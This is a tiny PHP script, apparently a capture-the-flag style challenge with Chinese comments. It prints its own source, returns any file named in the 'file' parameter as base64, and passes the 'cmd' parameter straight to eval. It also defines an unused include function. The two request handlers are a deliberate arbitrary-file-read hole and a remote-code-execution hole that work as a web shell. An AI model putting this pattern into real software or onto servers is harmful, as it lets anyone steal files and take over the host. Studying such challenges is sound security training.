<?php
show_source(__FILE__);
if ($_GET['file']){
    echo base64_encode(file_get_contents($_GET['file'])); //读取文件并输出
}else if($_GET['cmd']){
    eval($_GET['cmd']); //执行传入的PHP代码，例如 phpinfo();
}

function __include($file){
    include $file;
}
//像这种函数，写了又不调用，毫无作用